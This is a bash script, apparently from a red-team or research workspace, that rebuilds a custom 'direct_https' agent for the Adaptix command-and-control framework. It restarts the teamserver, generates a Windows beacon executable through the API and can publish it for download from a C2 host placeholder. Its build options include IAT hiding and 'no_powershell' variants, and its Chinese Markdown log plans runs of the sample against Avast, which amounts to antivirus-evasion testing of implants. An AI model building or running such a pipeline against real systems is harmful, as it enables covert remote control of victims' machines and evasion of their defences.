#!/usr/bin/env bash
set -euo pipefail

# Build, deploy, restart, and generate a fresh direct_https payload from the
# current Adaptix runtime. This prevents testing stale Windows agent binaries.

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
ROOT="${ROOT:-$(cd -- "$SCRIPT_DIR/.." && pwd)}"
SRC="$ROOT/AdaptixServer/extenders/direct_https_agent"
RT="$ROOT/dist/extenders/direct_https_agent"
ACTIVE_LISTENER_EXT="beacon_listener_http"
ACTIVE_LISTENER_SRC="$ROOT/AdaptixServer/extenders/$ACTIVE_LISTENER_EXT"
ACTIVE_LISTENER_RT="$ROOT/dist/extenders/$ACTIVE_LISTENER_EXT"
RESTART="$ROOT/restart-adaptix-server.sh"
DEFAULT_REPORT_ROOT="$ROOT/out/reports/feature-localization-avast"
REPORT_ROOT="$DEFAULT_REPORT_ROOT"
SAMPLES_DIR="$DEFAULT_REPORT_ROOT/samples"
RUNS_DIR="$DEFAULT_REPORT_ROOT/runs"
PROGRESS_DIR="$ROOT/docs/progress"
HTTP_DIR="$ROOT/out/publish"
API_BASE="${ADAPTIX_API_BASE:-https://127.0.0.1:4321/endpoint}"
API_USER="${ADAPTIX_USERNAME:-ctf}"
API_VERSION="direct-https-regenerate-script"
LISTENER="https_8443_1"
AGENT_NAME="direct_https"
ARCH="x64"
FORMAT="Exe"
SLEEP_VALUE="4s"
JITTER="0"
IAT_HIDING="false"
USE_PROXY="false"
PROXY_TYPE="http"
PROXY_HOST=""
PROXY_PORT="3128"
PROXY_USERNAME=""
PROXY_PASSWORD=""
ROTATION_MODE="sequential"
DEFAULT_GOPROXY="${GOPROXY:-https://goproxy.cn,direct}"
EXTRA_TOOL_PATHS=(
    "$HOME/tools/go/bin"
    "/usr/local/go/bin"
)
PUBLISH_HTTP=0
SKIP_SERVER_BUILD=0
SKIP_LISTENER_BUILD=0
SKIP_BUILD=0
SKIP_SYNC=0
SKIP_RESTART=0
DRY_RUN=0
VARIANT=""

usage() {
    cat <<USAGE
Usage:
  $(basename "$0") VARIANT [options]

Purpose:
  Rebuild direct_https_agent from source, sync it into the Adaptix runtime,
  restart teamserver, call /agent/generate, save the new payload, and write a
  Markdown regeneration record.

Required:
  VARIANT                         Short variant label, e.g. V02_profile_only_change

Auth:
  Export ADAPTIX_PASSWORD before running, or create $ROOT/.adaptix_api.env
  containing ADAPTIX_PASSWORD=... . The script will prompt on a TTY if missing.

Options:
  --listener NAME                 Listener name. Default: $LISTENER
  --arch x64|x86                  Payload arch. Default: $ARCH
  --sleep VALUE                   Agent sleep. Default: $SLEEP_VALUE
  --jitter N                      Agent jitter. Default: $JITTER
  --api-base URL                  Adaptix API base. Default: $API_BASE
  --username USER                 Adaptix username. Default: $API_USER
  --report-root DIR               Report root. Default: $REPORT_ROOT
  --samples-dir DIR               Output sample dir. Default: REPORT_ROOT/samples
  --runs-dir DIR                  Run evidence dir. Default: REPORT_ROOT/runs
  --publish-http                  Also copy versioned payload into $HTTP_DIR
  --http-dir DIR                  HTTP publish directory. Default: $HTTP_DIR
  --iat-hiding                    Build with IAT hiding flag in payload config
  --skip-server-build             Do not rebuild dist/adaptixserver. Use with care.
  --skip-listener-build           Do not rebuild BeaconHTTP listener plugin. Use with care.
  --skip-build                    Do not rebuild direct_https_agent. Use with care.
  --skip-sync                     Do not sync source dist to runtime. Use with care.
  --skip-restart                  Do not restart teamserver. Use with care.
  --dry-run                       Print planned values and exit before changes.
  -h, --help                      Show this help.

Example:
  ADAPTIX_PASSWORD='***' $0 V03_no_powershell
  ADAPTIX_PASSWORD='***' $0 V02_profile_only_change --publish-http
USAGE
}

log()  { printf '[*] %s\n' "$*"; }
ok()   { printf '[+] %s\n' "$*"; }
warn() { printf '[!] %s\n' "$*" >&2; }
die()  { printf '[-] %s\n' "$*" >&2; exit 1; }

sanitize_variant() {
    local s="$1"
    s="${s// /_}"
    printf '%s' "$s" | sed -E 's/[^A-Za-z0-9._-]+/_/g; s/^_+//; s/_+$//'
}

json_bool() {
    case "$1" in
        true|TRUE|1|yes|YES) printf 'true' ;;
        *) printf 'false' ;;
    esac
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --listener) [[ $# -ge 2 ]] || die "--listener needs a value"; LISTENER="$2"; shift 2 ;;
        --arch) [[ $# -ge 2 ]] || die "--arch needs a value"; ARCH="$2"; shift 2 ;;
        --sleep) [[ $# -ge 2 ]] || die "--sleep needs a value"; SLEEP_VALUE="$2"; shift 2 ;;
        --jitter) [[ $# -ge 2 ]] || die "--jitter needs a value"; JITTER="$2"; shift 2 ;;
        --api-base) [[ $# -ge 2 ]] || die "--api-base needs a value"; API_BASE="$2"; shift 2 ;;
        --username) [[ $# -ge 2 ]] || die "--username needs a value"; API_USER="$2"; shift 2 ;;
        --report-root) [[ $# -ge 2 ]] || die "--report-root needs a value"; REPORT_ROOT="$2"; SAMPLES_DIR="$2/samples"; RUNS_DIR="$2/runs"; shift 2 ;;
        --samples-dir) [[ $# -ge 2 ]] || die "--samples-dir needs a value"; SAMPLES_DIR="$2"; shift 2 ;;
        --runs-dir) [[ $# -ge 2 ]] || die "--runs-dir needs a value"; RUNS_DIR="$2"; shift 2 ;;
        --publish-http) PUBLISH_HTTP=1; shift ;;
        --http-dir) [[ $# -ge 2 ]] || die "--http-dir needs a value"; HTTP_DIR="$2"; shift 2 ;;
        --iat-hiding) IAT_HIDING="true"; shift ;;
        --skip-server-build) SKIP_SERVER_BUILD=1; shift ;;
        --skip-listener-build) SKIP_LISTENER_BUILD=1; shift ;;
        --skip-build) SKIP_BUILD=1; shift ;;
        --skip-sync) SKIP_SYNC=1; shift ;;
        --skip-restart) SKIP_RESTART=1; shift ;;
        --dry-run) DRY_RUN=1; shift ;;
        -h|--help) usage; exit 0 ;;
        --*) die "Unknown option: $1" ;;
        *)
            if [[ -z "$VARIANT" ]]; then
                VARIANT="$1"
                shift
            else
                die "Unexpected positional argument: $1"
            fi
            ;;
    esac
done

[[ -n "$VARIANT" ]] || { usage; die "VARIANT is required"; }
case "$ARCH" in x64|x86) ;; *) die "--arch must be x64 or x86" ;; esac
[[ "$FORMAT" == "Exe" ]] || die "Only Exe format is supported by direct_https"

VARIANT_SAFE="$(sanitize_variant "$VARIANT")"
[[ -n "$VARIANT_SAFE" ]] || die "VARIANT becomes empty after sanitization"
TS="$(date +%Y%m%d-%H%M%S)"
DATE_ISO="$(date -Is)"
RUN_DIR="$RUNS_DIR/regenerate-${VARIANT_SAFE}-${TS}"
OUT_NAME="direct_https_${VARIANT_SAFE}_${TS}.${ARCH}.exe"
OUT_PATH="$SAMPLES_DIR/$OUT_NAME"
MD_PATH="$PROGRESS_DIR/$(date +%Y-%m-%d)-direct-https-regenerate-${VARIANT_SAFE}-${TS}.md"

for tool_path in "${EXTRA_TOOL_PATHS[@]}"; do
    if [[ -d "$tool_path" && ":$PATH:" != *":$tool_path:"* ]]; then
        export PATH="$tool_path:$PATH"
    fi
done

ENV_FILE="${ADAPTIX_ENV_FILE:-$ROOT/.adaptix_api.env}"
if [[ -f "$ENV_FILE" ]]; then
    # shellcheck disable=SC1090
    set -a
    source "$ENV_FILE"
    set +a
fi
API_PASSWORD="${ADAPTIX_PASSWORD:-}"

log "Plan"
echo "  variant       : $VARIANT_SAFE"
echo "  root          : $ROOT"
echo "  source        : $SRC"
echo "  runtime       : $RT"
echo "  listener      : $LISTENER"
echo "  arch          : $ARCH"
echo "  out           : $OUT_PATH"
echo "  run dir       : $RUN_DIR"
echo "  markdown      : $MD_PATH"
echo "  api base      : $API_BASE"
echo "  publish http  : $PUBLISH_HTTP"
echo "  go            : $(command -v go 2>/dev/null || true)"
echo "  goproxy       : $DEFAULT_GOPROXY"
echo "  build server  : $(( 1 - SKIP_SERVER_BUILD ))"
echo "  build listener: $(( 1 - SKIP_LISTENER_BUILD )) ($ACTIVE_LISTENER_EXT)"
echo "  build agent   : $(( 1 - SKIP_BUILD ))"

if [[ "$DRY_RUN" -eq 1 ]]; then
    ok "Dry run complete; no changes made."
    exit 0
fi

[[ -d "$ROOT" ]] || die "ROOT not found: $ROOT"
[[ -d "$SRC" ]] || die "source extender not found: $SRC"
[[ -d "$ACTIVE_LISTENER_SRC" ]] || die "active listener source not found: $ACTIVE_LISTENER_SRC"
[[ -d "$ROOT/dist" ]] || die "Adaptix runtime dist not found: $ROOT/dist"
[[ -x "$RESTART" ]] || die "restart helper not executable: $RESTART"
command -v make >/dev/null || die "make not found"
command -v rsync >/dev/null || die "rsync not found"
command -v python3 >/dev/null || die "python3 not found"
command -v sha256sum >/dev/null || die "sha256sum not found"

if [[ "$SKIP_SERVER_BUILD" -eq 0 || "$SKIP_LISTENER_BUILD" -eq 0 || "$SKIP_BUILD" -eq 0 ]]; then
    command -v go >/dev/null || die "go not found in PATH. Install Go or export PATH to include the Go binary before rebuilding direct_https_agent."
fi
if [[ "$SKIP_LISTENER_BUILD" -eq 0 || "$SKIP_BUILD" -eq 0 ]]; then
    command -v x86_64-w64-mingw32-g++ >/dev/null || die "x86_64-w64-mingw32-g++ not found; install/configure the MinGW x64 toolchain."
    command -v i686-w64-mingw32-g++ >/dev/null || die "i686-w64-mingw32-g++ not found; install/configure the MinGW x86 toolchain. The current Makefile builds both x64 and x86 objects."
fi

if [[ -z "$API_PASSWORD" ]]; then
    if [[ -t 0 ]]; then
        read -r -s -p "Adaptix password for ${API_USER}: " API_PASSWORD
        echo
    else
        die "ADAPTIX_PASSWORD is not set. Export it or create $ENV_FILE."
    fi
fi

mkdir -p "$RUN_DIR" "$SAMPLES_DIR" "$PROGRESS_DIR"
RUNTIME_BACKUP_DIR="$RUN_DIR/runtime-before-change"

restore_runtime_backup() {
    warn "Restoring runtime backup from $RUNTIME_BACKUP_DIR"
    if [[ -f "$RUNTIME_BACKUP_DIR/adaptixserver" ]]; then
        cp -a "$RUNTIME_BACKUP_DIR/adaptixserver" "$ROOT/dist/adaptixserver"
    fi
    if [[ -d "$RUNTIME_BACKUP_DIR/extenders/$ACTIVE_LISTENER_EXT" ]]; then
        mkdir -p "$ACTIVE_LISTENER_RT"
        rsync -a --delete "$RUNTIME_BACKUP_DIR/extenders/$ACTIVE_LISTENER_EXT/" "$ACTIVE_LISTENER_RT/"
    fi
    if [[ -d "$RUNTIME_BACKUP_DIR/extenders/direct_https_agent" ]]; then
        mkdir -p "$RT"
        rsync -a --delete "$RUNTIME_BACKUP_DIR/extenders/direct_https_agent/" "$RT/"
    fi
}

check_runtime_after_restart() {
    local latest_log
    latest_log="$(ls -1t "$ROOT"/dist/logs/adaptixserver-*.log 2>/dev/null | head -1 || true)"
    [[ -n "$latest_log" ]] || die "No adaptixserver log found after restart"
    echo "$latest_log" > "$RUN_DIR/latest-server-log.txt"
    sed -E 's/\x1b\[[0-9;]*m//g' "$latest_log" > "$RUN_DIR/latest-server-log.clean.txt" || true
    if grep -E 'failed to open plugin|plugin was built with a different version|does not register|Failed to restore listener' "$RUN_DIR/latest-server-log.clean.txt" > "$RUN_DIR/runtime-load-errors.txt"; then
        restore_runtime_backup
        "$RESTART" > "$RUN_DIR/restart-after-rollback.log" 2>&1 || true
        die "Runtime plugin/listener load check failed after restart. Backup restored; see $RUN_DIR/runtime-load-errors.txt"
    fi
    if ! ss -ltnp '( sport = :4321 or sport = :8443 )' 2>/dev/null | grep -q ':8443'; then
        restore_runtime_backup
        "$RESTART" > "$RUN_DIR/restart-after-rollback.log" 2>&1 || true
        die "Port 8443 is not listening after restart. Backup restored."
    fi
    ok "Runtime load check passed: plugins loaded and 8443 is listening."
}

log "Recording pre-build state"
{
    echo "timestamp=$DATE_ISO"
    echo "variant=$VARIANT_SAFE"
    echo "root=$ROOT"
    echo "source=$SRC"
    echo "runtime=$RT"
    echo "listener=$LISTENER"
    echo "arch=$ARCH"
    echo "out_path=$OUT_PATH"
} > "$RUN_DIR/00-params.txt"

git -C "$ROOT" status --short > "$RUN_DIR/git-status-before.txt" || true
ps -eo pid,lstart,cmd | grep -E 'adaptixserver|AdaptixClient|http.server' | grep -v grep > "$RUN_DIR/process-before.txt" || true
ss -lntp 2>/dev/null | grep -E ':(4321|8443|8000)\b' > "$RUN_DIR/listeners-before.txt" || true

log "Backing up current runtime server and active extenders"
mkdir -p "$RUNTIME_BACKUP_DIR/extenders"
cp -a "$ROOT/dist/adaptixserver" "$RUNTIME_BACKUP_DIR/adaptixserver" 2>/dev/null || true
if [[ -d "$ACTIVE_LISTENER_RT" ]]; then
    mkdir -p "$RUNTIME_BACKUP_DIR/extenders/$ACTIVE_LISTENER_EXT"
    rsync -a "$ACTIVE_LISTENER_RT/" "$RUNTIME_BACKUP_DIR/extenders/$ACTIVE_LISTENER_EXT/"
fi
if [[ -d "$RT" ]]; then
    mkdir -p "$RUNTIME_BACKUP_DIR/extenders/direct_https_agent"
    rsync -a "$RT/" "$RUNTIME_BACKUP_DIR/extenders/direct_https_agent/"
fi

if [[ "$SKIP_SERVER_BUILD" -eq 0 ]]; then
    log "Building Adaptix server to keep Go plugin package versions aligned"
    (cd "$ROOT" && GOPROXY="$DEFAULT_GOPROXY" make server) 2>&1 | tee "$RUN_DIR/make-server.log"
else
    warn "Skipping server build step by request"
    echo "SKIPPED" > "$RUN_DIR/make-server.log"
fi

if [[ "$SKIP_LISTENER_BUILD" -eq 0 ]]; then
    log "Building active listener extender: $ACTIVE_LISTENER_EXT"
    (cd "$ACTIVE_LISTENER_SRC" && GOPROXY="$DEFAULT_GOPROXY" make) 2>&1 | tee "$RUN_DIR/make-$ACTIVE_LISTENER_EXT.log"
else
    warn "Skipping active listener build step by request"
    echo "SKIPPED" > "$RUN_DIR/make-$ACTIVE_LISTENER_EXT.log"
fi

if [[ "$SKIP_BUILD" -eq 0 ]]; then
    log "Building source extender with make"
    (cd "$SRC" && GOPROXY="$DEFAULT_GOPROXY" make) 2>&1 | tee "$RUN_DIR/make.log"
else
    warn "Skipping build step by request"
    echo "SKIPPED" > "$RUN_DIR/make.log"
fi

if [[ "$SKIP_SYNC" -eq 0 ]]; then
    log "Syncing source dist to runtime extenders"
    if [[ "$SKIP_LISTENER_BUILD" -eq 0 ]]; then
        [[ -d "$ACTIVE_LISTENER_SRC/dist" ]] || die "active listener source dist missing after build: $ACTIVE_LISTENER_SRC/dist"
        mkdir -p "$ACTIVE_LISTENER_RT"
        rsync -a --delete "$ACTIVE_LISTENER_SRC/dist/" "$ACTIVE_LISTENER_RT/" 2>&1 | tee "$RUN_DIR/rsync-$ACTIVE_LISTENER_EXT.log"
    else
        echo "SKIPPED" > "$RUN_DIR/rsync-$ACTIVE_LISTENER_EXT.log"
    fi
    [[ -d "$SRC/dist" ]] || die "source dist missing after build: $SRC/dist"
    mkdir -p "$RT"
    rsync -a --delete "$SRC/dist/" "$RT/" 2>&1 | tee "$RUN_DIR/rsync.log"
else
    warn "Skipping runtime sync by request"
    echo "SKIPPED" > "$RUN_DIR/rsync.log"
fi

if [[ "$SKIP_RESTART" -eq 0 ]]; then
    log "Restarting Adaptix teamserver"
    "$RESTART" 2>&1 | tee "$RUN_DIR/restart.log"
else
    warn "Skipping teamserver restart by request"
    echo "SKIPPED" > "$RUN_DIR/restart.log"
fi

log "Recording post-restart state"
ps -eo pid,lstart,cmd | grep -E 'adaptixserver|AdaptixClient|http.server' | grep -v grep > "$RUN_DIR/process-after-restart.txt" || true
ss -lntp 2>/dev/null | grep -E ':(4321|8443|8000)\b' > "$RUN_DIR/listeners-after-restart.txt" || true
if [[ "$SKIP_RESTART" -eq 0 ]]; then
    check_runtime_after_restart
fi

IAT_BOOL="$(json_bool "$IAT_HIDING")"
USE_PROXY_BOOL="$(json_bool "$USE_PROXY")"
CONFIG_JSON="$(
ARCH="$ARCH" \
FORMAT="$FORMAT" \
SLEEP_VALUE="$SLEEP_VALUE" \
JITTER="$JITTER" \
IAT_BOOL="$IAT_BOOL" \
USE_PROXY_BOOL="$USE_PROXY_BOOL" \
PROXY_TYPE="$PROXY_TYPE" \
PROXY_HOST="$PROXY_HOST" \
PROXY_PORT="$PROXY_PORT" \
PROXY_USERNAME="$PROXY_USERNAME" \
PROXY_PASSWORD="$PROXY_PASSWORD" \
ROTATION_MODE="$ROTATION_MODE" \
python3 - <<'PY'
import json, os
def b(name):
    return os.environ.get(name, '').lower() in ('1', 'true', 'yes', 'on')
cfg={
  'os':'Windows',
  'arch':os.environ['ARCH'],
  'format':os.environ['FORMAT'],
  'sleep':os.environ['SLEEP_VALUE'],
  'jitter':int(os.environ['JITTER']),
  'is_killdate':False,
  'kill_date':'',
  'kill_time':'',
  'is_workingtime':False,
  'start_time':'',
  'end_time':'',
  'iat_hiding':b('IAT_BOOL'),
  'use_proxy':b('USE_PROXY_BOOL'),
  'proxy_type':os.environ['PROXY_TYPE'],
  'proxy_host':os.environ['PROXY_HOST'],
  'proxy_port':int(os.environ['PROXY_PORT']),
  'proxy_username':os.environ['PROXY_USERNAME'],
  'proxy_password':os.environ['PROXY_PASSWORD'],
  'rotation_mode':os.environ['ROTATION_MODE'],
}
print(json.dumps(cfg,separators=(',',':')))
PY
)"

log "Generating fresh payload through Adaptix API"
API_BASE="$API_BASE" \
API_USER="$API_USER" \
API_PASSWORD="$API_PASSWORD" \
API_VERSION="$API_VERSION-$VARIANT_SAFE-$TS" \
LISTENER="$LISTENER" \
AGENT_NAME="$AGENT_NAME" \
CONFIG_JSON="$CONFIG_JSON" \
OUT_PATH="$OUT_PATH" \
META_PATH="$RUN_DIR/generate-api.json" \
python3 - <<'PY'
import base64, hashlib, json, os, ssl, sys, time, urllib.request

base=os.environ['API_BASE'].rstrip('/')
user=os.environ['API_USER']
password=os.environ['API_PASSWORD']
version=os.environ['API_VERSION']
listener=os.environ['LISTENER']
agent=os.environ['AGENT_NAME']
config_json=os.environ['CONFIG_JSON']
out_path=os.environ['OUT_PATH']
meta_path=os.environ['META_PATH']
ctx=ssl._create_unverified_context()

def req(path, method='GET', data=None, token=None, timeout=90):
    headers={}
    body=None
    if token:
        headers['Authorization']='Bearer '+token
    if data is not None:
        headers['Content-Type']='application/json'
        body=json.dumps(data).encode()
    r=urllib.request.Request(base+path, data=body, headers=headers, method=method)
    with urllib.request.urlopen(r, context=ctx, timeout=timeout) as resp:
        raw=resp.read().decode('utf-8','replace')
        if not raw:
            return {'_status': resp.status, '_raw': ''}
        try:
            obj=json.loads(raw)
        except Exception:
            return {'_status': resp.status, '_raw': raw}
        if isinstance(obj, dict):
            obj.setdefault('_status', resp.status)
        return obj

login=req('/login','POST',{'username':user,'password':password,'version':version},timeout=30)
if 'access_token' not in login:
    raise SystemExit('login failed: '+json.dumps(login,ensure_ascii=False))
tok=login['access_token']
obj=req('/agent/generate','POST',{'listener_name':[listener],'agent':agent,'config':config_json},tok,timeout=120)
if not obj.get('ok'):
    raise SystemExit('generate failed: '+json.dumps(obj,ensure_ascii=False))
try:
    name64,data64=obj['message'].split(':',1)
    api_name=base64.b64decode(name64).decode('utf-8','replace')
    data=base64.b64decode(data64)
except Exception as e:
    raise SystemExit('invalid generate response: '+repr(e))
os.makedirs(os.path.dirname(out_path), exist_ok=True)
with open(out_path,'wb') as f:
    f.write(data)
sha=hashlib.sha256(data).hexdigest()
redacted_cfg=json.loads(config_json)
if redacted_cfg.get('proxy_password'):
    redacted_cfg['proxy_password']='REDACTED'
meta={
    'ok': True,
    'generated_at': time.strftime('%Y-%m-%dT%H:%M:%S%z'),
    'api_filename': api_name,
    'sample_path': out_path,
    'sha256': sha,
    'size': len(data),
    'listener': listener,
    'agent': agent,
    'config_redacted': redacted_cfg,
}
with open(meta_path,'w',encoding='utf-8') as f:
    json.dump(meta,f,ensure_ascii=False,indent=2)
print(json.dumps(meta,ensure_ascii=False,indent=2))
PY

SHA256="$(sha256sum "$OUT_PATH" | awk '{print $1}')"
SIZE="$(stat -c '%s' "$OUT_PATH")"
MTIME="$(stat -c '%y' "$OUT_PATH")"
FILE_INFO="$(file "$OUT_PATH" 2>/dev/null || true)"
printf '%s  %s\n' "$SHA256" "$OUT_PATH" > "$RUN_DIR/sample.sha256"
stat -c 'size=%s mtime=%y path=%n' "$OUT_PATH" > "$RUN_DIR/sample.stat"
file "$OUT_PATH" > "$RUN_DIR/sample.file" 2>/dev/null || true

PUBLISHED_PATH=""
PUBLISHED_URL=""
if [[ "$PUBLISH_HTTP" -eq 1 ]]; then
    log "Publishing versioned payload to HTTP directory"
    [[ -d "$HTTP_DIR" ]] || die "HTTP directory not found: $HTTP_DIR"
    PUBLISHED_PATH="$HTTP_DIR/$OUT_NAME"
    cp -f "$OUT_PATH" "$PUBLISHED_PATH"
    sha256sum "$PUBLISHED_PATH" > "$RUN_DIR/published-http.sha256"
    PUBLISHED_URL="http://C2_HOST_PLACEHOLDER:8000/$OUT_NAME"
    ok "Published: $PUBLISHED_URL"
fi

git -C "$ROOT" status --short > "$RUN_DIR/git-status-after.txt" || true
ps -eo pid,lstart,cmd | grep -E 'adaptixserver|AdaptixClient|http.server' | grep -v grep > "$RUN_DIR/process-after-generate.txt" || true
ss -lntp 2>/dev/null | grep -E ':(4321|8443|8000)\b' > "$RUN_DIR/listeners-after-generate.txt" || true

cat > "$MD_PATH" <<MD
# direct_https agent regenerate: $VARIANT_SAFE

## 目标

重新构建并生成 direct_https agent，避免源码更新后继续测试旧 payload。

## 时间

- 开始时间：$DATE_ISO
- 生成时间：$(date -Is)

## 参数

- variant: \`$VARIANT_SAFE\`
- listener: \`$LISTENER\`
- arch: \`$ARCH\`
- sleep: \`$SLEEP_VALUE\`
- jitter: \`$JITTER\`
- iat_hiding: \`$IAT_BOOL\`

## 涉及路径

- source extender: \`$SRC\`
- runtime extender: \`$RT\`
- run evidence: \`$RUN_DIR\`
- sample: \`$OUT_PATH\`

## 执行步骤

1. 记录 Git / process / listener 状态。
2. 执行 source extender build：\`make\`。
3. 同步 source \`dist/\` 到 runtime extender。
4. 重启 Adaptix teamserver。
5. 通过 Adaptix API \`/agent/generate\` 生成新的 payload。
6. 记录 SHA256、大小、mtime。

## 新样本

- path: \`$OUT_PATH\`
- sha256: \`$SHA256\`
- size: \`$SIZE\`
- mtime: \`$MTIME\`
- file: \`$FILE_INFO\`
MD

if [[ -n "$PUBLISHED_PATH" ]]; then
cat >> "$MD_PATH" <<MD

## HTTP 发布

- path: \`$PUBLISHED_PATH\`
- url: \`$PUBLISHED_URL\`

注意：发布的是带版本号的文件，没有覆盖旧的 \`direct_https.x64.exe\`。
MD
fi

cat >> "$MD_PATH" <<MD

## 关键证据文件

- params: \`$RUN_DIR/00-params.txt\`
- make log: \`$RUN_DIR/make.log\`
- rsync log: \`$RUN_DIR/rsync.log\`
- restart log: \`$RUN_DIR/restart.log\`
- generate API meta: \`$RUN_DIR/generate-api.json\`
- sample hash: \`$RUN_DIR/sample.sha256\`
- Git before: \`$RUN_DIR/git-status-before.txt\`
- Git after: \`$RUN_DIR/git-status-after.txt\`

## 验证结果

- 本脚本已完成 Linux 侧 build / sync / restart / generate。
- 尚未自动投放 Windows，也未执行 Windows 侧 AV 矩阵。
- 下一步必须把新样本传到 Windows，核对 Windows 文件 SHA256 与上方 SHA256 一致后再执行。

## 下一步

1. 将样本复制到 Windows 测试目录。
2. Windows 上执行 \`Get-FileHash -Algorithm SHA256\`，确认等于 \`$SHA256\`。
3. 执行新 exe。
4. 确认新 agent id / 新 PID / 新 first callback time。
5. 跑 Avast 矩阵或命令矩阵。
MD

ok "Generated sample: $OUT_PATH"
ok "SHA256: $SHA256"
ok "Evidence dir: $RUN_DIR"
ok "Markdown record: $MD_PATH"
